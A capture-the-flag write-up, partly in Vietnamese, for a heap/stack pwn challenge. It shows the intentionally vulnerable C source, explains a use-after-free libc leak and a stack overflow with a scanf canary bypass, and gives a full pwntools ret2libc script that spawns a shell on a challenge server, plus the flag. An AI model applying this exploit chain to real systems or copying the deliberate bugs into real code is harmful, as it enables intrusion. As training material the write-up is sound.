# PWN2 

- 1 chall khá hay 

## Source C

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

char *review[5];
int size[5];
void writereview()
{
    unsigned int movie = 0;
    puts("\nHow many movie you want to write review(max is 5 though)");
    scanf("%d",&movie);
    if(movie <= 5) 
    {
        for(int i =0 ;i<movie;i++)
        {
            puts("how long is your review?");
            scanf("%d",&size[i]);
            review[i] = (char*) malloc(size[i]);
            puts("Give us some of your thought on the movie!!!");
            read(0,review[i],size[i] - 1);
        }

    }    
}
void removeReview()
{
    unsigned int i;
    puts("\nwhich review you want to remove??");
    scanf("%u",&i);
    if(i<5 && review[i])
    {
        free(review[i]);
    }
}


void ReviewTheReview()
{
    unsigned int i ;
    puts("Which review you want to look back!!!!");
    scanf("%u",&i);
    if(i<5)
    {
        puts(review[i]);
    }
}

void timeout() {
    puts("Timeout");
    exit(1);
}

void setup() {
    signal(0xe,&timeout);
    alarm(60);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

int main()
{
    setup();
    int option;
    int n_guest;
    unsigned int lucky_index;
    unsigned long lucky[10];
    puts("\nWELCOME TO KCSC LETTERBOXD MINI PROGRAM!");
    while(1)
    {
        puts("\nwhat do you like to do?");
        scanf("%d",&option);
        switch(option)
        {
            case 1:
                writereview();
                break;
            case 2:
                ReviewTheReview();
                break ;
            case 3:
                removeReview();
                break;
            case 4:
                puts("\nTHIS IS JUST A MINI GAME , THE PRIZE IS NOTHING BUT THE CONTENT OF SOME FLAG\n");
                puts("\nHOW MANY NUMBER YOU WANT TO BET?(max is 10 tho)");
                scanf("%d",&n_guest);
                if(n_guest <= 10)
                {
                    for(int i = 0;i < n_guest;i++)
                    {
                        scanf("%ld",&lucky[lucky_index++]);
                    }
                }
                break;
            case 5:
                puts("bye bye");
                return 0;
            default:
                puts("\nnothing here!!");
        }

    }
}

```

## Analysis
- tại 3 option đầu cho phép ta malloc, free, và in ra content => lợi dụng UAF để leak libc
- tại option 4 phải tinh mắt mới tìm ra bug, đó là BOF, vì mỗi lần nhập thì lucky_index đều tăng lên, khi kết thúc lần đầu lucky_index = 10, khi chọn lại option 4 thì lucky_index sẽ tiếp tục tăng và ta có BOF

## Exploit
- đầu tiền ta leak libc trước vì nó đơn giản thôi

```python 
# add(1, 0x500, b'aaaa')

p.sendlineafter(b'do?\n', b'1')
p.sendlineafter(b'though)\n', str(2))
p.sendlineafter(b'review?\n', str(0x500))
p.sendlineafter(b'movie!!!\n', b'a')
p.sendlineafter(b'review?\n', str(0x50))
p.sendlineafter(b'movie!!!\n', b'a')


delete(0)
show(0)
# p.recvuntil(b'back!!!!\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x219ce0
print(hex(libc_leak))
print(hex(libc.address))
```
- có được libc rồi , ta tiếp tục ret2libc ở option4, lần đầu ta nhập đại, lần sau ta sẽ bypass canary bằng '+', sau đó ta set rbp, rsi, rdx, cuối cùng rdi để lấy shell trên server 

```python
p.sendlineafter(b'do?\n', b'4')
p.sendlineafter(b'tho)\n', b'10')
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))

pop_rdi = 0x000000000002a3e5 + libc.address
pop_rsi = 0x000000000002be51 + libc.address 
pop_rdx = 0x00000000000796a2 + libc.address
rw_section = libc.address + 0x219500

p.sendlineafter(b'do?\n', b'4')
p.sendlineafter(b'tho)\n', b'10')
p.sendline(b'+')
p.sendline(b'+')
p.sendline(str(rw_section))
p.sendline(str(pop_rdi+1))
p.sendline(str(pop_rdi))
p.sendline(str(next(libc.search(b'/bin/sh'))))
p.sendline(str(pop_rsi))
p.sendline(str(0))
p.sendline(str(pop_rdx))
p.sendline(str(0))
p.sendlineafter(b'do?\n', b'4')
p.sendlineafter(b'tho)\n', b'1')
p.sendline(str(libc.sym['system']))
p.sendlineafter(b'do?\n', b'5')
```

## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*main+238
# b*main+300
# c
# ''')

# input()

p = remote('103.162.14.116', 20002)

def add(idx, size, data):
    p.sendlineafter(b'do?\n', b'1')
    p.sendlineafter(b'though)\n', str(idx))
    p.sendlineafter(b'review?\n', str(size))
    p.sendlineafter(b'movie!!!\n', data)

def delete(idx):
    p.sendlineafter(b'do?\n', b'3')
    p.sendlineafter(b'remove??\n', str(idx))
    
def show(idx):
    p.sendlineafter(b'do?\n', b'2')
    p.sendlineafter(b'back!!!!\n', str(idx))


# add(1, 0x500, b'aaaa')

p.sendlineafter(b'do?\n', b'1')
p.sendlineafter(b'though)\n', str(2))
p.sendlineafter(b'review?\n', str(0x500))
p.sendlineafter(b'movie!!!\n', b'a')
p.sendlineafter(b'review?\n', str(0x50))
p.sendlineafter(b'movie!!!\n', b'a')


delete(0)
show(0)
# p.recvuntil(b'back!!!!\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x219ce0
print(hex(libc_leak))
print(hex(libc.address))

p.sendlineafter(b'do?\n', b'4')
p.sendlineafter(b'tho)\n', b'10')
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))
p.sendline(str(10))

pop_rdi = 0x000000000002a3e5 + libc.address
pop_rsi = 0x000000000002be51 + libc.address 
pop_rdx = 0x00000000000796a2 + libc.address
rw_section = libc.address + 0x219500

p.sendlineafter(b'do?\n', b'4')
p.sendlineafter(b'tho)\n', b'10')
p.sendline(b'+')
p.sendline(b'+')
p.sendline(str(rw_section))
p.sendline(str(pop_rdi+1))
p.sendline(str(pop_rdi))
p.sendline(str(next(libc.search(b'/bin/sh'))))
p.sendline(str(pop_rsi))
p.sendline(str(0))
p.sendline(str(pop_rdx))
p.sendline(str(0))
p.sendlineafter(b'do?\n', b'4')
p.sendlineafter(b'tho)\n', b'1')
p.sendline(str(libc.sym['system']))
p.sendlineafter(b'do?\n', b'5')

p.interactive()

# KCSC{easy_heap_and_scanf_right}
```

## Flag 

KCSC{easy_heap_and_scanf_right}
